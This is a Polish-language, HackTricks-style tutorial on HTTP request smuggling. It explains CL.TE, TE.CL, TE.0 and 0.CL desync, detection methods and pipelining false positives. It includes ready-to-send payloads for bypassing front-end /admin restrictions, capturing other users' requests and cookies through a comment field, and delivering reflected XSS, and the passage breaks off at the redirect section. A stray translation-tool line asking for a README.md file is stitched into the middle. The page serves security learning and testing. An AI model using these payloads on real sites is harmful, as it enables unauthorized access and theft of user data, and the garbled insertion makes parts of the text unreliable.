# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Co to jest

Ta podatność występuje, gdy **desynchronizacja** między **front-end proxies** a serwerem **back-end** pozwala **atakującemu** wysłać żądanie HTTP, które będzie **interpretowane** jako **pojedyncze żądanie** przez **front-end** (load balancer / reverse-proxy) i **jako 2 żądania** przez serwer **back-end**.\
Pozwala to użytkownikowi **zmodyfikować następne żądanie**, które dotrze do serwera back-end po jego własnym żądaniu.

### Teoria

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Rzeczywistość

Front-End (load-balancer / Reverse Proxy) przetwarza nagłówek _**Content-Length**_ lub _**Transfer-Encoding**_, a serwer Back-end przetwarza **drugi** z nich, powodując **desynchronizację** między tymi dwoma systemami.\
To może być bardzo krytyczne, ponieważ **atakujący będzie w stanie wysłać jedno żądanie** do reverse proxy, które zostanie **zinterpretowane** przez serwer **back-end** **jako 2 różne żądania**. Niebezpieczeństwo tej techniki polega na tym, że serwer **back-end** zinterpretuje **wstrzyknięte drugie żądanie** tak, jakby **pochodziło od następnego klienta**, a rzeczywiste żądanie tego klienta stanie się **częścią** żądania wstrzykniętego.

### Szczególności

Pamiętaj, że w HTTP **znak nowej linii składa się z 2 bajtów:**

- **Content-Length**: Ten nagłówek używa **liczby dziesiętnej**, aby wskazać **liczbę bajtów** ciała żądania. Oczekuje się, że body zakończy się ostatnim znakiem — **nie jest wymagany nowy wiersz na końcu żądania**.
- **Transfer-Encoding:** Ten nagłówek używa w **body** **liczby heksadecymalnej**, aby wskazać **liczbę bajtów** następnego chunku. **Chunk** musi **kończyć się** nową linią, ale ta nowa linia **nie jest wliczana** do wartości długości. Ta metoda transferu musi zakończyć się **chunkiem o rozmiarze 0, po którym następują 2 nowe linie**: `0`
- **Connection**: Na podstawie mojego doświadczenia zalecane jest używanie **`Connection: keep-alive`** w pierwszym żądaniu przy próbie Request Smuggling.

### Widoczne - Ukryte

Główny problem z HTTP/1.1 polega na tym, że wszystkie żądania idą po tym samym gniazdku TCP, więc jeśli wystąpi rozbieżność między 2 systemami odbierającymi żądania, możliwe jest wysłanie jednego żądania, które zostanie potraktowane jako 2 różne żądania (lub więcej) przez końcowy backend (lub nawet systemy pośredniczące).

[This blog post](https://portswigger.net/research/http1-must-die) proponuje nowe sposoby wykrywania desync attacków, które nie będą wykrywane przez WAFy. Przedstawia on koncepcję Visible vs Hidden behaviours. Celem w tym przypadku jest znalezienie rozbieżności w odpowiedziach przy użyciu technik, które mogą powodować desynchronizacje, bez faktycznego ich eksploatowania.

Na przykład, wysyłając żądanie z normalnym nagłówkiem host i nagłówkiem " host", jeśli backend narzeka na to żądanie (może dlatego, że wartość " host" jest niepoprawna), może to oznaczać, że front-end nie zauważył nagłówka " host", podczas gdy końcowy backend go użył — co z dużym prawdopodobieństwem oznacza desynchronizację między front-end a back-end.

To byłaby rozbieżność **Ukryte-Widoczne**.

Jeśli front-end uwzględni nagłówek " host", a back-end nie, mogłaby to być sytuacja **Widoczne-Ukryte**.

Na przykład, pozwoliło to odkryć desynchronizacje między AWS ALB jako front-end a IIS jako backendem. Działo się tak dlatego, że gdy wysłano "Host: foo/bar", ALB zwrócił `400, Server; awselb/2.0`, ale gdy wysłano "Host : foo/bar", zwrócił `400, Server: Microsoft-HTTPAPI/2.0`, wskazując, że backend wysłał odpowiedź. To była sytuacja Ukryte-Widoczne (H-V).

Zauważ, że to zachowanie nie jest poprawione w AWS, ale można je złagodzić ustawiając `routing.http.drop_invalid_header_fields.enabled` oraz `routing.http.desync_mitigation_mode = strictest`.


## Podstawowe przykłady

> [!TIP]
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

Ataki HTTP request smuggling są tworzone przez wysyłanie dwuznacznych żądań, które wykorzystują rozbieżności w sposobie, w jaki front-end i back-end interpretują nagłówki `Content-Length` (CL) i `Transfer-Encoding` (TE). Ataki te mogą występować w różnych formach, głównie jako **CL.TE**, **TE.CL** i **TE.TE**. Każdy typ reprezentuje unikalne połączenie sposobu, w jaki front-end i back-end priorytetyzują te nagłówki. Podatności wynikają z tego, że serwery przetwarzają to samo żądanie w różny sposób, prowadząc do nieoczekiwanych i potencjalnie złośliwych rezultatów.

### Podstawowe przykłady typów podatności

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> To the previous table you should add the TE.0 technique, like CL.0 technique but using Transfer Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Przetwarza żądanie na podstawie nagłówka `Content-Length`.
- **Back-End (TE):** Przetwarza żądanie na podstawie nagłówka `Transfer-Encoding`.
- **Scenariusz ataku:**

- Atakujący wysyła żądanie, w którym wartość nagłówka `Content-Length` nie odpowiada rzeczywistej długości treści.
- Front-end przekazuje całe żądanie do back-endu na podstawie wartości `Content-Length`.
- Back-end przetwarza żądanie jako chunked z powodu nagłówka `Transfer-Encoding: chunked`, interpretując pozostałe dane jako odrębne, kolejne żądanie.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Przetwarza żądanie na podstawie nagłówka `Transfer-Encoding`.
- **Back-End (CL):** Przetwarza żądanie na podstawie nagłówka `Content-Length`.
- **Scenariusz ataku:**

- Atakujący wysyła żądanie chunked, gdzie rozmiar chunka (`7b`) i rzeczywista długość treści (`Content-Length: 4`) nie zgadzają się.
- Front-end, honorując `Transfer-Encoding`, przekazuje całe żądanie do back-endu.
- Back-end, respektując `Content-Length`, przetwarza tylko początkową część żądania ( `7b` bajtów), pozostawiając resztę jako niezamierzone kolejne żądanie.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Serwery:** Oba wspierają `Transfer-Encoding`, ale jeden może zostać oszukany, aby go zignorować poprzez obfuskację.
- **Scenariusz ataku:**

- Atakujący wysyła żądanie z obfuskowanymi nagłówkami `Transfer-Encoding`.
- W zależności od tego, który serwer (front-end lub back-end) nie rozpozna obfuskacji, można wykorzystać podatność CL.TE lub TE.CL.
- Nieprzetworzona część żądania, widziana przez jeden z serwerów, staje się częścią kolejnego żądania, prowadząc do smuggowania.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Oba serwery przetwarzają żądanie wyłącznie na podstawie nagłówka `Content-Length`.
- Ten scenariusz zazwyczaj nie prowadzi do smuggowania, ponieważ istnieje zgodność w sposobie interpretacji długości żądania przez obie strony.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Odnosi się do scenariuszy, w których nagłówek `Content-Length` jest obecny i ma wartość różną od zera, co wskazuje, że body żądania zawiera treść. Back-end ignoruje nagłówek `Content-Length` (traktowany jako 0), ale front-end go parsuje.
- Jest to istotne przy zrozumieniu i tworzeniu ataków smuggling, ponieważ wpływa na to, jak serwery określają koniec żądania.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Jak poprzedni, ale używając TE.
- Technika [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Przykład**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Scenariusz

W sytuacji `0.CL` żądanie jest wysyłane z nagłówkiem Content-Length takim jak:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
Front-end nie uwzględnia `Content-Length`, więc wysyła do backendu tylko pierwsze żądanie (aż do 7 w przykładzie). Natomiast backend widzi `Content-Length` i czeka na body, które nigdy nie nadchodzi, ponieważ front-end już czeka na odpowiedź.

Jeśli jednak istnieje żądanie, które można wysłać do backendu i które zostanie obsłużone przed otrzymaniem body tego żądania, to zakleszczenie nie wystąpi. W IIS na przykład dzieje się tak przy wysyłaniu żądań do zabronionych nazw jak `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), w ten sposób początkowe żądanie zostanie obsłużone bezpośrednio, a drugie żądanie będzie zawierać żądanie ofiary takie jak:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
To jest przydatne do spowodowania desync, ale do tej pory nie miało żadnego wpływu.

Jednak post proponuje rozwiązanie, konwertując **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Uszkodzenie serwera WWW

Technika ta jest też przydatna w scenariuszach, gdzie możliwe jest **break a web server while reading the initial HTTP data** ale **without closing the connection**. W ten sposób **body** of the HTTP request będzie traktowane jako **next HTTP request**.

Na przykład, jak wyjaśniono w [**this writeup**](https://mizu.re/post/twisty-python), w Werkzeug możliwe było wysłać kilka znaków **Unicode**, które powodowały **break** serwera. Jednak jeśli połączenie HTTP zostało utworzone z nagłówkiem **`Connection: keep-alive`**, body żądania nie zostanie odczytane, a połączenie pozostanie otwarte, więc **body** of the request będzie traktowane jako **next HTTP request**.

#### Wymuszanie przez hop-by-hop headers

Nadużywając hop-by-hop headers można skłonić proxy do **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
Aby uzyskać **więcej informacji o hop-by-hop headers**, odwiedź:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Wykrywanie HTTP Request Smuggling

Identyfikacja podatności na HTTP request smuggling często może być przeprowadzona za pomocą technik opartych na czasie, które polegają na obserwowaniu, ile czasu zajmuje serwerowi odpowiedź na zmanipulowane żądania. Techniki te są szczególnie przydatne do wykrywania podatności CL.TE i TE.CL. Oprócz tych metod istnieją inne strategie i narzędzia, które można wykorzystać do odnalezienia takich podatności:

### Wykrywanie podatności CL.TE przy użyciu technik opartych na czasie

- **Metoda:**

- Wyślij żądanie, które — jeśli aplikacja jest podatna — spowoduje, że serwer back-end będzie oczekiwał dodatkowych danych.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Obserwacja:**
- Serwer front-end przetwarza żądanie na podstawie `Content-Length` i przerywa wiadomość przedwcześnie.
- Serwer back-end, oczekując wiadomości chunked, czeka na następny chunk, który nigdy nie nadchodzi, co powoduje opóźnienie.

- **Wskaźniki:**
- Timeouty lub długie opóźnienia w odpowiedzi.
- Otrzymywanie błędu 400 Bad Request od serwera back-end, czasem z dodatkowymi szczegółami o serwerze.

### Wykrywanie podatności TE.CL przy użyciu technik opartych na czasie

- **Metoda:**

- Wyślij żądanie, które — jeśli aplikacja jest podatna — spowoduje, że serwer back-end będzie oczekiwał dodatkowych danych.
- **Przykład:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Obserwacja:**
- Serwer front-end przetwarza żądanie na podstawie `Transfer-Encoding` i przekazuje całe żądanie dalej.
- Serwer back-end, oczekując wiadomości na podstawie `Content-Length`, czeka na dodatkowe dane, które nigdy nie nadchodzą, powodując opóźnienie.

### Inne metody wykrywania podatności

- **Analiza różnic w odpowiedziach:**
- Wyślij nieznacznie zmienione wersje żądania i obserwuj, czy odpowiedzi serwera różnią się w nieoczekiwany sposób, co wskazywałoby na rozbieżności w parsowaniu.
- **Użycie narzędzi automatycznych:**
- Narzędzia takie jak rozszerzenie 'HTTP Request Smuggler' do Burp Suite mogą automatycznie testować te podatności, wysyłając różne formy niejednoznacznych żądań i analizując odpowiedzi.
- **Testy wariancji `Content-Length`:**
- Wyślij żądania z różnymi wartościami `Content-Length`, które nie odpowiadają rzeczywistej długości treści, i obserwuj, jak serwer radzi sobie z takimi niezgodnościami.
- **Testy wariancji `Transfer-Encoding`:**
- Wyślij żądania z zniekształconymi lub niepoprawnie sformatowanymi nagłówkami `Transfer-Encoding` i obserwuj, jak różnie serwer front-end i back-end reagują na takie manipulacje.

### Nagłówek `Expect: 100-continue`

Sprawdź, jak ten nagłówek może pomóc w wykorzystaniu http desync w:

{{#ref}}
../special-http-headers.md
{{#endref}}

### Testowanie podatności HTTP Request Smuggling

Po potwierdzeniu skuteczności technik opartych na czasie ważne jest sprawdzenie, czy żądania klienta można manipulować. Prostą metodą jest próba zatrucia żądań — na przykład spowodowanie, aby żądanie do `/` zwróciło 404. Przykłady `CL.TE` i `TE.CL` omówione wcześniej w [Basic Examples](#basic-examples) pokazują, jak zatrucie żądania klienta może wywołać odpowiedź 404, mimo że klient próbował uzyskać dostęp do innego zasobu.

**Kluczowe kwestie**

Podczas testowania podatności na request smuggling przez ingerencję w inne żądania, pamiętaj:

- **Osobne połączenia sieciowe:** Żądania "attack" i "normal" powinny być wysłane przez oddzielne połączenia sieciowe. Wykorzystanie tego samego połączenia dla obu nie potwierdza obecności podatności.
- **Spójny URL i parametry:** Staraj się używać identycznych URL-i i nazw parametrów dla obu żądań. Nowoczesne aplikacje często kierują żądania do konkretnych serwerów back-end na podstawie URL i parametrów. Dopasowanie tych elementów zwiększa prawdopodobieństwo, że oba żądania trafią do tego samego serwera, co jest warunkiem koniecznym powodzenia ataku.
- **Warunki wyścigu i timing:** Żądanie "normal", mające na celu wykrycie ingerencji ze strony żądania "attack", konkuruje z innymi równoczesnymi żądaniami aplikacji. Dlatego wyślij żądanie "normal" bezpośrednio po żądaniu "attack". W przypadku obciążonych aplikacji może być konieczne wykonanie wielu prób, aby jednoznacznie potwierdzić podatność.
- **Wyzwania związane z load balancingiem:** Serwery front-end działające jako load balancery mogą rozdzielać żądania pomiędzy różne systemy back-end. Jeśli żądania "attack" i "normal" trafią na różne systemy, atak nie powiedzie się. Ten aspekt load balancingu może wymagać kilku prób, aby potwierdzić podatność.
- **Niezamierzony wpływ na użytkowników:** Jeśli twój atak niezamierzenie wpłynie na żądanie innego użytkownika (nie na wysłane przez ciebie żądanie "normal"), oznacza to, że atak wpłynął na innego użytkownika aplikacji. Ciągłe testy mogą zakłócać działanie innych użytkowników, co wymaga ostrożnego podejścia.

## Rozróżnianie artefaktów HTTP/1.1 pipelining od prawdziwego request smuggling

Ponowne użycie połączenia (keep-alive) i pipelining mogą łatwo powodować iluzje "smuggling" w narzędziach testujących, które wysyłają wiele żądań na tym samym gniazdku. Naucz się oddzielać nieszkodliwe artefakty po stronie klienta od prawdziwej desynchronizacji po stronie serwera.

### Dlaczego pipelining powoduje klasyczne fałszywe pozytywy

HTTP/1.1 ponownie używa jednego połączenia TCP/TLS i konkatenizuje żądania i odpowiedzi w tym samym strumieniu. W pipeliningu klient wysyła wiele żądań jedno po drugim i polega na odpowiedziach w tej samej kolejności. Powszechny fałszywy pozytyw to ponowne wysłanie zniekształconego ładunku w stylu CL.0 dwukrotnie na jednym połączeniu:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Proszę wklej zawartość pliku README.md (lub fragmenty), które chcesz przetłumaczyć — przetłumaczę widoczny tekst na polski, zachowując dokładnie wszystkie tagi, linki, ścieżki, kod i nazwy technik zgodnie z wytycznymi.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Jeśli serwer zignorował sfałszowany `Content_Length`, nie ma FE↔BE desync. Przy reuse klient faktycznie wysłał ten byte-stream, który serwer zinterpretował jako dwa niezależne żądania:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Wpływ: żaden. Po prostu odsynchronizowałeś klienta od ramowania po stronie serwera.

> [!TIP]
> Moduły Burp, które zależą od reuse/pipelining: Turbo Intruder z `requestsPerConnection>1`, Intruder z "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" lub "Enable connection reuse".

### Testy kontrolne: pipelining czy rzeczywiste desync?

1. Wyłącz reuse i przetestuj ponownie
- W Burp Intruder/Repeater wyłącz HTTP/1 reuse i unikaj "Send group in sequence".
- W Turbo Intruder ustaw `requestsPerConnection=1` i `pipeline=False`.
- Jeśli zachowanie zniknie, prawdopodobnie był to client-side pipelining, chyba że masz do czynienia z connection-locked/stateful targetami lub client-side desync.
2. Sprawdzenie zagnieżdżonej odpowiedzi HTTP/2
- Wyślij żądanie HTTP/2. Jeśli ciało odpowiedzi zawiera kompletną zagnieżdżoną odpowiedź HTTP/1, udowodniłeś backend parsing/desync bug zamiast czystego artefaktu po stronie klienta.
3. Probe partial-requests dla connection-locked front-endów
- Niektóre FEs ponownie używają upstream BE connection tylko wtedy, gdy klient powtórnie użył swojej. Użyj partial-requests, aby wykryć zachowanie FE, które odzwierciedla reuse klienta.
- Zobacz PortSwigger "Browser‑Powered Desync Attacks" dla techniki connection-locked.
4. Probe stanu (state probes)
- Szukaj różnic między pierwszym a kolejnymi żądaniami na tym samym połączeniu TCP (first-request routing/validation).
- Burp "HTTP Request Smuggler" zawiera connection‑state probe, który to automatyzuje.
5. Wizualizuj ruch na łączu
- Użyj rozszerzenia Burp "HTTP Hacker", aby bezpośrednio sprawdzić konkatenację i ramowanie wiadomości podczas eksperymentów z reuse i partial requests.

### Connection‑locked request smuggling (wymaga reuse)

Niektóre front-endy ponownie używają upstream connection tylko wtedy, gdy klient powtórnie użyje swojego. Rzeczywiste smuggling istnieje, ale jest warunkowe względem client-side reuse. Aby rozróżnić i udowodnić wpływ:
- Udowodnij bug po stronie serwera
- Użyj HTTP/2 nested-response check, lub
- Użyj partial-requests, aby pokazać, że FE ponownie używa upstream tylko wtedy, gdy robi to klient.
- Pokaż rzeczywisty wpływ, nawet jeśli bezpośrednie nadużycie socketów między użytkownikami jest zablokowane:
- Cache poisoning: zatruj shared caches przez desync, tak aby odpowiedzi wpływały na innych użytkowników.
- Internal header disclosure: odzwierciedl FE-injected headers (np. auth/trust headers) i pivot do auth bypass.
- Bypass FE controls: przemyć restricted paths/methods poza front-end.
- Host-header abuse: połącz z dziwactwami routingu hostów, aby pivotować do internal vhosts.
- Procedura operatora
- Odtwórz z kontrolowanym reuse (Turbo Intruder `requestsPerConnection=2`, lub Burp Repeater tab group → "Send group in sequence (single connection)").
- Następnie połącz to z primitives do cache/header-leak/control-bypass i zademonstruj cross-user lub authorization impact.

> Zobacz też connection‑state attacks, które są blisko powiązane, ale technicznie nie są smugglingiem:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Ograniczenia client‑side desync

Jeśli celujesz w browser-powered/client-side desync, złośliwe żądanie musi być wysyłalne przez przeglądarkę cross-origin. Triki z obfuskacją headerów nie zadziałają. Skoncentruj się na primitives osiągalnych przez navigation/fetch, a następnie pivotuj do cache poisoning, header disclosure lub bypass FE controls tam, gdzie downstream komponenty odzwierciedlają lub cache’ują odpowiedzi.

Dla kontekstu i end-to-end workflow:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Narzędzia pomagające w decyzji

- HTTP Hacker (Burp BApp Store): ujawnia low-level HTTP behavior i socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precyzyjna kontrola nad connection reuse przez `requestsPerConnection`.
- Burp HTTP Request Smuggler: zawiera connection‑state probe do wykrywania first‑request routing/validation.

> [!NOTE]
> Traktuj efekty wymagające tylko reuse jako nieistotne, chyba że potrafisz udowodnić server-side desync i powiązać go z konkretnym wpływem (poisoned cache artifact, leaked internal header umożliwiający privilege bypass, bypassed FE control itp.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Czasami front-end proxies egzekwują security measures, analizując przychodzące żądania. Jednak te mechanizmy można obejść, wykorzystując HTTP Request Smuggling, co pozwala na nieautoryzowany dostęp do restricted endpoints. Na przykład dostęp do `/admin` może być zabroniony z zewnątrz, a front-end proxy aktywnie blokuje takie próby. Niemniej jednak proxy może nie sprawdzać embedded requests wewnątrz smuggled HTTP request, co tworzy lukę pozwalającą na obejście tych ograniczeń.

Poniżej przykłady ilustrujące, jak HTTP Request Smuggling może być użyte do ominięcia front-end security controls, szczególnie celując w ścieżkę `/admin`, która zazwyczaj jest chroniona przez front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
W ataku CL.TE nagłówek `Content-Length` jest wykorzystywany do żądania początkowego, natomiast kolejne osadzone żądanie korzysta z nagłówka `Transfer-Encoding: chunked`. Front-end proxy przetwarza początkowe żądanie `POST`, ale nie sprawdza osadzonego żądania `GET /admin`, co pozwala na nieautoryzowany dostęp do ścieżki `/admin`.

**TE.CL Przykład**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Z kolei w ataku TE.CL początkowe żądanie `POST` używa `Transfer-Encoding: chunked`, a osadzone następne żądanie jest przetwarzane na podstawie nagłówka `Content-Length`. Podobnie jak w ataku CL.TE, front-end proxy pomija przemycone żądanie `GET /admin`, nieumyślnie umożliwiając dostęp do zastrzeżonej ścieżki `/admin`.

### Odkrywanie przepisywania żądań przez front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Aplikacje często używają **front-end server** do modyfikowania przychodzących żądań przed przekazaniem ich do **back-end server**. Typową modyfikacją jest dodanie nagłówków, takich jak `X-Forwarded-For: <IP of the client>`, aby przekazać IP klienta do back-endu. Zrozumienie tych modyfikacji może być kluczowe, ponieważ może ujawnić sposoby na **obejście zabezpieczeń** lub **odkrycie ukrytych informacji lub endpointów**.

Aby zbadać, jak proxy zmienia żądanie, znajdź parametr POST, który back-end odzwierciedla w odpowiedzi. Następnie skonstruuj żądanie, używając tego parametru jako ostatniego, podobne do poniższego:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
W tej strukturze kolejne komponenty żądania są dopisywane po `search=`, który jest parametrem odzwierciedlanym w odpowiedzi. To odzwierciedlenie ujawni nagłówki kolejnego żądania.

Ważne jest, aby dopasować nagłówek `Content-Length` zagnieżdżonego żądania do rzeczywistej długości treści. Zaleca się zaczynać od małej wartości i stopniowo ją zwiększać, ponieważ zbyt niska wartość obetnie odzwierciedlone dane, podczas gdy zbyt wysoka może spowodować błąd żądania.

Ta technika ma też zastosowanie w kontekście podatności TE.CL, ale żądanie powinno zakończyć się `search=\r\n0`. Niezależnie od znaków nowej linii, wartości zostaną dopisane do parametru search.

Metoda ta służy głównie do zrozumienia modyfikacji żądań wykonywanych przez front-endowy proxy, zasadniczo przeprowadzając samodzielne dochodzenie.

### Przechwytywanie żądań innych użytkowników <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Możliwe jest przechwycenie żądań następnego użytkownika przez dopisanie konkretnego żądania jako wartości parametru podczas operacji POST. Oto jak można to osiągnąć:

Dopisując poniższe żądanie jako wartość parametru, możesz zapisać żądanie kolejnego klienta:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
W tym scenariuszu **comment parameter** ma służyć do przechowywania zawartości sekcji komentarzy posta na stronie dostępnej publicznie. W konsekwencji zawartość następnego żądania pojawi się jako komentarz.

Ta technika ma jednak ograniczenia. Zazwyczaj przechwytuje dane tylko do delimitera parametru użytego w smuggled request. Dla URL-encoded przesyłania formularzy tym separatorem jest znak `&`. Oznacza to, że przechwycona zawartość żądania ofiary zatrzyma się na pierwszym `&`, który może nawet być częścią query string.

Warto też zaznaczyć, że podejście to działa również przy podatności TE.CL. W takich przypadkach żądanie powinno kończyć się na `search=\r\n0`. Niezależnie od znaków nowej linii, wartości zostaną dopisane do parametru search.

### Wykorzystanie HTTP request smuggling do eksploatacji Reflected XSS

HTTP Request Smuggling można wykorzystać do ataku na strony podatne na **Reflected XSS**, co daje znaczące korzyści:

- Interakcja z docelowymi użytkownikami **nie jest wymagana**.
- Pozwala na eksploatację XSS w częściach żądania, które są **zwykle niedostępne**, na przykład nagłówki HTTP.

W scenariuszach, gdzie strona jest podatna na Reflected XSS poprzez nagłówek User-Agent, poniższy payload pokazuje, jak wykorzystać tę podatność:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload jest skonstruowany, aby wykorzystać podatność poprzez:

1. Zainicjowanie `POST` requestu, pozornie typowego, z nagłówkiem `Transfer-Encoding: chunked`, wskazującym początek smugglingu.
2. Następnie `0`, oznaczające koniec chunked message body.
3. Potem wprowadzany jest smuggled `GET` request, w którym nagłówek `User-Agent` zawiera skrypt `<script>alert(1)</script>`, wyzwalający XSS, gdy serwer przetworzy to kolejne żądanie.

Manipulując `User-Agent` przez smuggling, payload omija standardowe ograniczenia żądań, w ten sposób wykorzystując podatność Reflected XSS w niestandardowy, ale skuteczny sposób.

#### HTTP/0.9

> [!CAUTION]
> W przypadku, gdy zawartość użytkownika jest odzwierciedlona w odpowiedzi z **`Content-type`** takim jak **`text/plain`**, co zapobiega wykonaniu XSS. Jeśli serwer obsługuje **HTTP/0.9**, może być możliwe obejście tego!

Wersja HTTP/0.9 występowała przed 1.0 i używa wyłącznie metody **GET** oraz **nie** zwraca nagłówków, jedynie treść odpowiedzi.

W [**this writeup**](https://mizu.re/post/twisty-python) zostało to nadużyte przy użyciu request smuggling i **podatnego endpointu, który odpowie zawartością wprowadzonej przez użytkownika**, aby wsmugglować żądanie w HTTP/0.9. Parametr, który był odzwierciedlany w odpowiedzi, zawierał **fałszywą odpowiedź HTTP/1.1 (z nagłówkami i body)**, więc odpowiedź zawierała poprawny wykonywalny kod JS z `Content-Type` ustawionym na `text/html`.

### Wykorzystywanie przekierowań w obrębie serwisu przy użyciu HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Aplikacje często przekierowują z jednego URL na inny, używając nazwy hosta z nagłówka `Host` w URL przekierowania. Jest to powszechne w serwerach WWW takich jak Apache i IIS. Na przykład żądanie katalogu bez końcowego ukośnika skutkuje przekierowaniem, które dodaje ten ukośnik:
```
GET /home HTTP/1.1
